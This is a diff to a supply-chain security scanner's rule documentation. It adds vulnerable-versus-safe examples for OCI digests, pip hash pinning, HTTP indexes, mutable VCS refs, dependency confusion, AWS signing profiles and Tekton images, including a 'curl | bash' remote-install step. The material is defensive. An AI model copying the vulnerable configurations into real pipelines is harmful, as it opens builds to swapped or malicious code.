+  "architecture": "amd64",
+  "fsLayers": [
+    { "blobSum": "sha256:abc123..." }
+  ],
+  "history": [
+    { "v1Compatibility": "..." }
+  ]
+}
+
+# Safe: rebuild with a current builder (``docker buildx
+# build`` / ``buildah`` / ``ko``). The registry produces a
+# v2 manifest with content-addressed layer descriptors and
+# a ``config`` descriptor that pins the image config by
+# digest.
+{
+  "schemaVersion": 2,
+  "mediaType": "application/vnd.oci.image.manifest.v1+json",
+  "config": {
+    "mediaType": "application/vnd.oci.image.config.v1+json",
+    "digest": "sha256:config-digest...",
+    "size": 7023
+  },
+  "layers": [
+    {
+      "mediaType": "application/vnd.oci.image.layer.v1.tar+gzip",
+      "digest": "sha256:layer-digest...",
+      "size": 32654
+    }
+  ]
+}
+```
+
 **Source:** [`OCI-007`](../providers/oci.md#oci-007) in the [OCI manifest provider](../providers/oci.md).
 
 ### `OCI-008`: Manifest references digest using unsupported hash algorithm <span class="pg-sev pg-sev--high">HIGH</span> { #detail-oci-008 }
@@ -3516,6 +5488,54 @@ Detection scope: the config descriptor digest, every layer descriptor digest (si
 **Known false positives.**
 
 - Test fixtures and intentionally-corrupt CTF images sometimes use degraded hashes for pedagogical reasons. Suppress on the specific path with an ignore-file when this is the deliberate shape.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: descriptors pin layers by ``sha1:`` digest.
+# sha1 has had practical collisions since SHAttered (2017).
+# An attacker who produces a colliding blob substitutes a
+# different tarball without changing the manifest; the
+# registry's content-addressing then ratifies the swap.
+{
+  "schemaVersion": 2,
+  "mediaType": "application/vnd.oci.image.manifest.v1+json",
+  "config": {
+    "mediaType": "application/vnd.oci.image.config.v1+json",
+    "digest": "sha1:abc1234567890abcdef1234567890abcdef12345",
+    "size": 7023
+  },
+  "layers": [
+    {
+      "mediaType": "application/vnd.oci.image.layer.v1.tar+gzip",
+      "digest": "sha1:def4567890abcdef1234567890abcdef123456",
+      "size": 32654
+    }
+  ]
+}
+
+# Safe: every descriptor uses ``sha256:`` (or ``sha512:``,
+# also OCI-permitted). The 256-bit hash space rules out
+# birthday-attack collisions at any plausibly-buildable
+# scale; a substituted blob cannot match the recorded
+# digest.
+{
+  "schemaVersion": 2,
+  "mediaType": "application/vnd.oci.image.manifest.v1+json",
+  "config": {
+    "mediaType": "application/vnd.oci.image.config.v1+json",
+    "digest": "sha256:abc123def456abc123def456abc123def456abc123def456abc123def456abc1",
+    "size": 7023
+  },
+  "layers": [
+    {
+      "mediaType": "application/vnd.oci.image.layer.v1.tar+gzip",
+      "digest": "sha256:def456abc123def456abc123def456abc123def456abc123def456abc123def4",
+      "size": 32654
+    }
+  ]
+}
+```
 
 **Source:** [`OCI-008`](../providers/oci.md#oci-008) in the [OCI manifest provider](../providers/oci.md).
 
@@ -3560,6 +5580,37 @@ When ``--require-hashes`` is present, pip enforces hash pinning for every requir
 
 - PyTorch dependency confusion (December 2022): the ``torchtriton`` name on PyPI was claimed by a malicious publisher and pulled in via a nightly build, exfiltrating SSH keys and ``/etc/passwd``. Hash pinning would have rejected the unexpected artifact regardless of which registry resolved the name.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: requirements.txt pins the version literal
+# but doesn't pin the artifact bytes. A registry that
+# silently re-publishes ``requests-2.31.0`` with a
+# backdoored wheel (publisher takeover, mirror compromise,
+# MITM on an internal proxy) ships unverified code on the
+# next ``pip install``. Even ``--require-hashes`` doesn't
+# fire because the file doesn't declare it.
+# requirements.txt
+requests==2.31.0
+urllib3==2.0.7
+certifi==2024.2.2
+
+# Safe: regenerate with ``pip-compile --generate-hashes``
+# (pip-tools). Every line carries a ``--hash=sha256:...``
+# for the wheel and the sdist; ``--require-hashes`` at
+# the top makes pip refuse the install on any mismatch
+# or unhashed line.
+# requirements.txt
+--require-hashes
+requests==2.31.0 \
+    --hash=sha256:942c5a758f98d790eaed1a29cb6eefc7ffb0d1cf7af05c3d2791656dbd6ad1e1 \
+    --hash=sha256:58cd2187c01e70e6e26505bca751777aa9f2ee0b7f4300988b709f44e013003f
+urllib3==2.0.7 \
+    --hash=sha256:c97dfde1f7bd43a71c8d2a58e369e9b2bf692d1334ea9f9cae55add7d0dd0f84
+certifi==2024.2.2 \
+    --hash=sha256:0569859f95fc761b18b45ef421b1290a0f65f147e92a1e5eb3e635f9a5e4e66f
+```
+
 **Source:** [`PYPI-002`](../providers/pypi.md) in the [PyPI provider](../providers/pypi.md).
 
 ### `PYPI-003`: requirements.txt uses an HTTP index or disables TLS verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-pypi-003 }
@@ -3576,6 +5627,32 @@ Complements DF-021 (Dockerfile ``RUN pip install ``-i http://...``); PYPI-003 ca
 
 **Recommendation.** Switch ``--index-url`` and ``--extra-index-url`` to ``https://`` and remove ``--trusted-host``. If your internal index has a self-signed certificate, install the CA into the build environment's truststore (or pass ``PIP_CERT=/path/to/ca.pem``) instead of telling pip to skip verification. ``--trusted-host`` disables TLS verification *and* hash verification for the named host, so anyone on the network path can swap the wheel.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: pip resolves every package against a
+# plaintext-HTTP index. Any network attacker between the
+# build runner and the index (compromised corporate proxy,
+# malicious VPN exit, BGP hijack on the internal mirror)
+# swaps the wheel in flight. ``--trusted-host`` is worse:
+# pip then SKIPS hash verification for that host, so even
+# a ``--require-hashes`` file installs unverified bytes.
+# requirements.txt
+--index-url http://internal-pypi.example.com/simple
+--trusted-host internal-pypi.example.com
+requests==2.31.0
+
+# Safe: HTTPS with the index's certificate validated. For
+# an internal index on a private CA, install the CA into
+# the agent trust store or pass ``PIP_CERT=/path/to/ca.pem``
+# — never ``--trusted-host``. Hashes stay enforced.
+# requirements.txt
+--index-url https://internal-pypi.example.com/simple
+--require-hashes
+requests==2.31.0 \
+    --hash=sha256:942c5a758f98d790eaed1a29cb6eefc7ffb0d1cf7af05c3d2791656dbd6ad1e1
+```
+
 **Source:** [`PYPI-003`](../providers/pypi.md) in the [PyPI provider](../providers/pypi.md).
 
 ### `PYPI-004`: requirements.txt VCS dependency uses a mutable ref <span class="pg-sev pg-sev--high">HIGH</span> { #detail-pypi-004 }
@@ -3585,6 +5662,29 @@ Complements DF-021 (Dockerfile ``RUN pip install ``-i http://...``); PYPI-003 ca
 **How this is detected.** Fires on requirement lines whose URL is a VCS scheme (``git+https://``, ``git+ssh://``, ``hg+``, ``svn+``, ``bzr+``) and whose ``@<ref>`` segment is not a 40-character SHA. A line with no ``@<ref>`` at all also fires — that resolves to the default branch HEAD, the most mutable form. Note: ``foo @ git+https://...`` (PEP 508 direct URL) and ``-e git+https://...#egg=foo`` (legacy editable install) are both detected.
 
 **Recommendation.** Pin VCS requirements to a 40-character commit SHA: ``foo @ git+https://github.com/owner/repo.git@<sha>`` (or the legacy ``-e git+...@<sha>#egg=foo`` form). Branch and tag refs (``@main``, ``@v1.2.3``) are mutable, anyone with push access to the upstream repo can swap the contents of what your build pulls without changing the requirement line. A 40-char SHA is immutable. If the upstream isn't yours, prefer vendoring a fork into a private index and pinning by version + hash (PYPI-001 / PYPI-002).
+
+**Proof of exploit.**
+
+```
+# Vulnerable: every ``pip install -r requirements.txt``
+# resolves ``@main`` against the upstream repo. Whoever
+# can push to ``main`` (legitimate co-maintainer, leaked
+# PAT, account compromise on the upstream owner) ships
+# code into your build silently. Tag refs like ``@v1.2.3``
+# are barely better — git tags are mutable on the upstream
+# side and can be force-pushed at any time.
+# requirements.txt
+shared-utils @ git+https://github.com/myorg/shared-utils.git@main
+-e git+https://github.com/myorg/legacy.git@v1.2.3#egg=legacy
+
+# Safe: pin to a 40-character commit SHA. The git object
+# is immutable — a re-push under the same SHA fails the
+# hash check on fetch. Renovate / Dependabot's pip-vcs
+# ecosystem updaters bump these in reviewable PRs.
+# requirements.txt
+shared-utils @ git+https://github.com/myorg/shared-utils.git@0123456789abcdef0123456789abcdef01234567
+-e git+https://github.com/myorg/legacy.git@fedcba9876543210fedcba9876543210fedcba98#egg=legacy
+```
 
 **Source:** [`PYPI-004`](../providers/pypi.md) in the [PyPI provider](../providers/pypi.md).
 
@@ -3602,6 +5702,34 @@ If the extra index is a hash-locked internal proxy that serves *both* internal a
 
 - Alex Birsan, "Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies" (2021): internal package names harvested from public-facing manifests were registered on public PyPI / npm with higher version numbers; victim builds that declared the public index as an extra automatically pulled the attacker's package on the next install.
 - PyTorch ``torchtriton`` (December 2022): a typosquat name on PyPI's public index was preferred over the internal nightly build, exfiltrating SSH keys via a postinstall step. Single-index installations were unaffected.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: pip queries BOTH indexes for every package
+# name and picks the highest version. ``acme-internal`` is
+# an internal-only package the org publishes to the
+# private index. An attacker registers ``acme-internal``
+# on public PyPI with version ``99.0.0``; the next ``pip
+# install`` resolves to the attacker's wheel because
+# 99.0.0 > 1.2.3. This is the Birsan dependency-confusion
+# class — Apple / Microsoft / Yelp / Tesla / Uber all paid
+# Birsan a bounty for this exact shape.
+# requirements.txt
+--index-url https://internal-pypi.example.com/simple
+--extra-index-url https://pypi.org/simple
+acme-internal==1.2.3
+requests==2.31.0
+
+# Safe: single index. Configure the internal proxy to
+# transparently mirror PyPI for any name not published
+# internally; pip then resolves every package against ONE
+# source whose name allow-list the operator controls.
+# requirements.txt
+--index-url https://internal-pypi.example.com/simple
+acme-internal==1.2.3
+requests==2.31.0
+```
 
 **Source:** [`PYPI-005`](../providers/pypi.md) in the [PyPI provider](../providers/pypi.md).
 
@@ -3663,6 +5791,39 @@ ctx==0.2.2
 
 **Recommendation.** Rotate the signing profile: create a replacement and update every code-signing config that references the revoked profile. A revoked or canceled profile invalidates every signature it produced, lambdas relying on it will fail verification.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: AWS Signer profile is revoked or
+# inactive. Code-signing pipelines that route through
+# this profile silently fail (or fall back to
+# unsigned artifacts if the gate is permissive); the
+# unsigned artifacts then deploy without integrity
+# verification.
+import boto3
+signer = boto3.client('signer')
+signer.get_signing_profile(profileName='prod-lambda-signer')
+# {'status': 'Revoked', 'statusReason': 'compromise suspected'}
+
+# Safe: investigate the revocation, rotate to a new
+# profile if compromise is confirmed, or restore the
+# original if revoked in error. Either way, the
+# downstream pipeline reference (CodeSigningConfig on
+# Lambdas) must be updated to point at the active
+# profile so signed deploys resume.
+new_prof = signer.put_signing_profile(
+    profileName='prod-lambda-signer-v2',
+    platformId='AWSLambda-SHA384-ECDSA',
+)
+lambdacli = boto3.client('lambda')
+lambdacli.update_code_signing_config(
+    CodeSigningConfigArn='arn:aws:lambda:us-east-1:123:code-signing-config:csc-...',
+    AllowedPublishers={
+        'SigningProfileVersionArns': [new_prof['profileVersionArn']]
+    },
+)
+```
+
 **Source:** [`SIGN-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `TKN-001`: Tekton step image not pinned to a digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-tkn-001 }
@@ -3672,6 +5833,35 @@ ctx==0.2.2
 **How this is detected.** Applies to ``Task`` and ``ClusterTask`` kinds. The image must contain ``@sha256:`` followed by a 64-char hex digest. Any tag-only reference, including ``:latest``, fails.
 
 **Recommendation.** Pin every step image to a content-addressable digest (``gcr.io/tekton-releases/git-init@sha256:<digest>``). Tag-only references (``alpine:3.18``) and rolling tags (``alpine:latest``) let a compromised registry update redirect the step at the next pull, with no audit trail in the Task manifest.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``ubuntu:22.04`` is a mutable tag. Whoever
+# controls the registry can repoint it on the next 22.04.x
+# refresh; the next TaskRun pulls the swap silently.
+apiVersion: tekton.dev/v1
+kind: Task
+metadata: { name: build }
+spec:
+  steps:
+    - name: compile
+      image: ubuntu:22.04
+      script: |
+        make build
+
+# Safe: pin to the immutable sha256 digest. The leading
+# comment documents which tag the digest corresponds to.
+apiVersion: tekton.dev/v1
+kind: Task
+metadata: { name: build }
+spec:
+  steps:
+    - name: compile
+      image: ubuntu@sha256:abc123...  # ubuntu:22.04, refreshed YYYY-MM-DD
+      script: |
+        make build
+```
 
 **Source:** [`TKN-001`](../providers/tekton.md#tkn-001) in the [Tekton provider](../providers/tekton.md).
 
@@ -3688,6 +5878,39 @@ ctx==0.2.2
 **Known false positives.**
 
 - Tasks running entirely against an internal mirror (``curl https://internal-mirror/install.sh | sh`` where the mirror is the same supply chain as the task image itself) carry less marginal risk than a public-internet fetch, but the rule still fires because the curl-pipe primitive is the structural signal. ``curl -k`` to a TLS endpoint with a known self-signed CA likewise triggers; the canonical fix is to install the CA into the step image and drop ``-k``, but per-task suppression via ``--ignore-file`` is the escape hatch.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``curl | bash`` trusts the network path AND
+# the installer host. A MITM (compromised proxy, malicious
+# DNS) or a publisher compromise ships malicious code into
+# the step's shell with the step's full credential set
+# in scope (TaskRun ServiceAccount, mounted Secrets).
+apiVersion: tekton.dev/v1
+kind: Task
+spec:
+  steps:
+    - name: install-cli
+      image: alpine@sha256:abc123...
+      script: |
+        curl -fsSL https://installer.example.com/cli.sh | bash
+
+# Safe: download, verify against a known-good sha256, then
+# execute. If the upstream content changes, the digest
+# stops matching and the step fails loud.
+apiVersion: tekton.dev/v1
+kind: Task
+spec:
+  steps:
+    - name: install-cli
+      image: alpine@sha256:abc123...
+      script: |
+        set -e
+        curl -fsSL https://installer.example.com/cli.sh -o /tmp/cli.sh
+        echo 'a1b2c3d4...  /tmp/cli.sh' | sha256sum -c -
+        bash /tmp/cli.sh
+```
 
 **Source:** [`TKN-008`](../providers/tekton.md#tkn-008) in the [Tekton provider](../providers/tekton.md).
 
